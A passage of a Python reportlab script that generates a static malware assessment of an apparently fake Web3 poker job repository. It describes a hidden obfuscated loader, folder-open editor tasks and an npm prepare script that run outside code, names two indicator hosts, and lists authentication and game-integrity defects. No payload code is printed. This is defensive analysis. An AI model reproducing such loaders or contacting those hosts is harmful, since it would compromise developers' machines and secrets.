        P(
            "The exercise, such as it is, can be finished from the static findings in section 8 without starting the process. "
            "Login ignores the password. Sockets accept a claimed wallet address. Rebuy and under-sized raises are not constrained. JWT configuration does not point at a real environment file, and the token is logged. "
            "Those are the defects a genuine audit task would have been about. They are also the reason the rest of the repository should not be executed in order to demonstrate them."
        )
    )

    story += section("appendix", "11.  Appendix")
    story.append(P("Severity rubric", "h2"))
    story.append(
        data_table(
            ["Level", "Meaning in this report"],
            [
                ["Critical", "The file exists to run an outside program, or to start a file that does, during ordinary setup."],
                ["High", "Authentication or game integrity is defeated, or the document is the pretext that causes setup to happen."],
                ["Medium", "A real weakness that needs a running server and a further step, and that does not by itself execute attacker code."],
                ["Low", "A broken or unwired feature with little direct security effect."],
            ],
            [1.1 * inch, 6.05 * inch],
        )
    )
    story.append(Spacer(1, 6))
    story.append(
        P(
            "The 0–10 scores in Figure 5 use the same scale, stretched so two critical loaders can outrank a high finding: code execution on a routine action scores 9.5 to 10; a lure that causes that action scores about 8; an auth bypass scores about 8; configuration and relay issues sit between 4 and 6; an unwired database sits at 3. "
            "Heat-map cells use a 0–5 cut of the same judgment, split across five kinds of harm so a game bug does not inherit the color of a loader."
        )
    )
    story.append(P("Files that carried the result", "h2"))
    story.append(
        data_table(
            ["Path", "Role in the assessment"],
            [
                ["README.md", "Product claims and the install instruction."],
                [".vscode/tasks.json", "Both folder-open tasks."],
                [".vscode/settings.json", "Reviewed. No downloader."],
                ["package.json", "prepare script and the real dependency list."],
                ["server.js", "Imports routes at startup and never connects a database."],
                ["routes/index.js", "Requires the auth router."],
                ["routes/api/auth.js", "Visible router plus the hidden loader."],
                ["controllers/auth.js", "Password check removed."],
                ["controllers/users.js", "Registration hashing, for contrast."],
                ["middleware/auth.js", "JWT check and token logging."],
                ["middleware/index.js", "CORS, rate limit, commented-out Helmet."],
                ["config.js", "Env path and the missing token lifetime."],
                ["config/db.js", "Unused Mongo connector."],
                ["socket/index.js", "Unauthenticated events, rebuy, chat."],
                ["game/Table.js and game/Seat.js", "Raise and stack accounting."],
                ["client/src/pages/ConnectWallet/ConnectWallet.js", "Identity taken from the query string."],
                ["client/src/utils/interact.js", "Account request and chain switch only."],
                ["client/package.json", "React 16 / react-scripts 3. No lifecycle malware."],
                [".gitignore", "Leftover Office lock-file names."],
            ],
            [3.15 * inch, 4.0 * inch],
        )
    )
    story.append(Spacer(1, 8))
    story.append(P("Limitations", "h2"))
    story.append(bullet("Second stages were not retrieved. A statement such as “the Windows script installs a stealer” would be a guess. This report does not make it. The confirmed fact is that the script’s publisher gets a shell, and the JavaScript publisher gets <font face='Consolas' size='9'>eval</font> inside the server process."))
    story.append(bullet("Lockfiles were not diffed against the registry. A further malicious dependency is possible and was not the finding. The loaders do not need one."))
    story.append(bullet("No dynamic run was performed, so claims about whether <font face='Consolas' size='9'>jwt.sign</font> throws on an undefined <font face='Consolas' size='9'>expiresIn</font>, or about the exact CORS header values, follow from the library’s usual behavior and from the call as written."))
    story.append(bullet("Scores are judgments. Another reviewer could move F-07 or F-09 by one step. The critical set does not depend on that judgment: the tasks, the loader, and the prepare script are visible in source."))
    story.append(P("Statement of work", "h2"))
    story.append(
        P(
            "The obfuscated line in <font face='Consolas' size='9'>routes/api/auth.js</font> was decoded with a local Node one-liner that performed only the XOR and wrote the resulting text to a temporary file. "
            "That text was read, the indicators in section 9 were taken from it, and the temporary file was deleted. "
            "The project’s own Node process was not started. npm was not invoked. No HTTP client was pointed at <font face='Consolas' size='9'>api-checking-1.vercel.app</font> or at <font face='Consolas' size='9'>88.216.57.122</font>."
        )
    )
    story.append(Spacer(1, 8))
    story.append(P("Document control", "h2"))
    story.append(
        data_table(
            ["Field", "Value"],
            [
                ["Document", "Zyranova repository — malware and weakness assessment"],
                ["Version", "1.0  ·  21 November 2026"],
                ["Subject tree", "zyranova-main/zyranova-main"],
                ["Method", "Static review. One local blob decoded offline and discarded."],
                ["Not performed", "No install, no process start, no contact with remote hosts."],
                ["Charts", "Seven seaborn figures. Scores are analyst judgments, not telemetry."],
            ],
            [1.4 * inch, 5.75 * inch],
        )
    )
    story.append(Spacer(1, 10))
    story.append(
        callout(
            "<b>Handling.</b> Delete the tree, keep automatic tasks off, and do not install it. "
            "If it has already been installed or the folder-open tasks were allowed, treat the host as compromised and rotate every secret that lived there, from a different device. "
            "The poker defects are real and are secondary."
        )
    )
    return story


def main():
    ASSET.mkdir(parents=True, exist_ok=True)
    charts = build_charts()
    doc = SimpleDocTemplate(
        str(PDF_PATH),
        pagesize=letter,
        leftMargin=0.68 * inch,
        rightMargin=0.68 * inch,
        topMargin=0.72 * inch,
        bottomMargin=0.58 * inch,
        title="Zyranova repository — malware and weakness assessment",
        author="Static security assessment",
        subject="Findings from a local review of a suspected fake Web3 job repository. Remote payloads were not retrieved.",
    )
    doc.build(build_story(charts), onFirstPage=draw_cover, onLaterPages=draw_later)
    print(f"PDF {PDF_PATH}")
    for name, path in charts.items():
        print(f"FIG {name} {path}")


if __name__ == "__main__":
    main()
